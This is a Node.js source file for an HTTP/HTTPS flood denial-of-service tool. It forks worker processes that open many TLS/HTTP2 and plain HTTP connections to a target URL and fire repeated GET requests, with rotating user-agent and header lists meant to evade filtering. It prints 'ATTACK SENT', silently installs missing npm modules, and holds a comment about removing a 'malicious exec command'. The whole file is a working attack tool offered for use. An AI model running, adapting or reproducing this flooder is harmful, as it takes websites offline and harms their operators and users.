const requiredModules = ["colors", 'http2', "tls", "cluster", 'set-cookie-parser', "url", "crypto", "user-agents", "random-useragent", "net", 'fs'];
requiredModules.forEach(moduleName => {
  try {
    require.resolve(moduleName);
  } catch (error) {
    console.log("Installing the module " + moduleName + "...");
    const { execSync } = require("child_process");
    execSync("npm install " + moduleName);
  }
});

const net = require('net');
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
var colors = require("colors");
const randomUseragent = require("random-useragent");

// User agents array
const uap = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9", "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240", "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62", "Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13", "Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420", "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4504021560267656607 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5534684115277472898 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"];

// Other header arrays remain the same
const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"];
const cache_header = ["max-age=0", "no-cache", "no-store", "pre-check=0", 'post-check=0', "must-revalidate", "proxy-revalidate", "s-maxage=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "no-cache, no-store,private, max-age=604800, must-revalidate"];
const Generate_Encoding = ['*', "gzip, deflate", "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip", "gzip, compress", "compress, deflate", 'compress', "gzip, deflate, br", "deflate"];
const language_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", 'de-CH;q=0.7', "da, en-gb;q=0.8, en;q=0.7", 'cs;q=0.5', "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", 'pt-BR,pt;q=0.9', "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", 'si-LK,si;q=0.9', "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", 'sq-AL,sq;q=0.9', 'sr-Cyrl-RS,sr;q=0.9', 'sr-Latn-RS,sr;q=0.9', "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", 'te-IN,te;q=0.9', 'th-TH,th;q=0.9', 'tr-TR,tr;q=0.9', "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", 'zh-TW,zh;q=0.9', 'am-ET,am;q=0.8', "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", 'bs-Latn-BA,bs;q=0.8', "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", 'fr-CH,fr;q=0.8', "fr-BE,fr;q=0.8", "fr-LU,fr;q=0.8", "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", 'is-IS,is;q=0.8', "jv-Latn-ID,jv;q=0.8", 'ka-GE,ka;q=0.8', "kkj-CM,kkj;q=0.8", 'kl-GL,kl;q=0.8', "km-KH,km;q=0.8", 'kok-IN,kok;q=0.8', "ks-Arab-IN,ks;q=0.8", "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", 'mn-Mong-CN,mn;q=0.8', "mr-MN,mr;q=0.8", "ms-BN,ms;q=0.8", "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", 'nso-ZA,nso;q=0.8', "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", 'ps-AF,ps;q=0.8', "quz-BO,quz;q=0.8", "quz-EC,quz;q=0.8", "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", 'rw-RW,rw;q=0.8', "sd-Arab-PK,sd;q=0.8", "se-NO,se;q=0.8", "si-LK,si;q=0.8", 'smn-FI,smn;q=0.8', "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", 'ti-ER,ti;q=0.8', "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", 've-ZA,ve;q=0.8', 'wo-SN,wo;q=0.8', "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
const dest_header = ['audio', 'audioworklet', "document", 'embed', "empty", "font", "frame", 'iframe', 'image', "manifest", "object", 'paintworklet', "report", "script", "serviceworker", "sharedworker", "style", "track", 'video', "worker", "xslt"];
const platform = ["Windows", 'Linux', 'iPhone'];
const mode_header = ["cors", "navigate", 'no-cors', "same-origin", "websocket"];
const site_header = ["cross-site", "same-origin", "same-site", "none"];
const sec_ch_ua = ["\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Brave\";v=\"114\""];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6) {
  console.log("Usage: host time req thread GET");
  process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(':');
const sigalgs = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];
let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureProtocol = "TLS_client_method";

const headers = {};
const secureContextOptions = {
  'ciphers': ciphers,
  'sigalgs': SignalsList,
  'honorCipherOrder': true,
  'secureOptions': secureOptions,
  'secureProtocol': "TLS_client_method"
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
  'target': process.argv[2],
  'time': ~~process.argv[3],
  'Rate': ~~process.argv[4],
  'threads': ~~process.argv[5],
  'method': ~~process.argv[6]
};

const parsedTarget = new URL(args.target);

if (cluster.isPrimary) {
  for (let counter = 1; counter <= args.threads; counter++) {
    console.clear();
    console.log("ATTACK SENT".bgRed);
    console.log('TEAM'.blue);
    cluster.fork();
  }
} else {
  for (let i = 0; i < 10; i++) {
    setInterval(runFlooder, 0);
  }
}

function randomElement(array) {
  return array[Math.floor(Math.random() * array.length)];
}

function runFlooder() {
  const port = parsedTarget.protocol === "https:" ? 443 : 80;
  
  try {
    const socketOptions = {
      'port': port,
      'host': parsedTarget.hostname,
      'family': 4
    };

    const socket = net.connect(socketOptions);
    
    socket.setTimeout(10000);
    socket.setKeepAlive(true, 60000);
    socket.setNoDelay(true);

    socket.on('connect', () => {
      if (parsedTarget.protocol === 'https:') {
        // HTTPS connection
        const tlsOptions = {
          'socket': socket,
          'host': parsedTarget.hostname,
          'servername': parsedTarget.hostname,
          'rejectUnauthorized': false,
          'secureContext': secureContext,
          'ALPNProtocols': ['h2', 'http/1.1']
        };

        const tlsSocket = tls.connect(tlsOptions);
        
        tlsSocket.on('secureConnect', () => {
          // Create HTTP/2 connection directly to target
          const client = http2.connect(parsedTarget.origin, {
            'createConnection': () => tlsSocket
          });

          client.on('connect', () => {
            // Send requests
            for (let i = 0; i < args.Rate; i++) {
              try {
                const req = client.request({
                  ':method': 'GET',
                  ':path': parsedTarget.pathname || '/',
                  ':authority': parsedTarget.hostname,
                  ':scheme': 'https',
                  'user-agent': randomElement(uap),
                  'accept': randomElement(accept_header)
                });
                
                req.on('response', () => {});
                req.end();
              } catch (e) {
                // Ignore errors
              }
            }
          });

          client.on('error', () => {
            client.destroy();
            socket.destroy();
          });

          setTimeout(() => {
            client.destroy();
            socket.destroy();
          }, 5000);
        });

        tlsSocket.on('error', () => {
          socket.destroy();
        });
      } else {
        // HTTP connection
        const request = `GET ${parsedTarget.pathname || '/'} HTTP/1.1\r\n` +
                       `Host: ${parsedTarget.hostname}\r\n` +
                       `User-Agent: ${randomElement(uap)}\r\n` +
                       `Accept: ${randomElement(accept_header)}\r\n` +
                       `Connection: close\r\n\r\n`;
        
        socket.write(request);
        
        setTimeout(() => {
          socket.destroy();
        }, 5000);
      }
    });

    socket.on('error', () => {
      // Ignore connection errors
    });

    socket.on('timeout', () => {
      socket.destroy();
    });

  } catch (error) {
    // Ignore errors
  }
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

// Remove the malicious exec command at the end
console.log("Attack running without proxies");
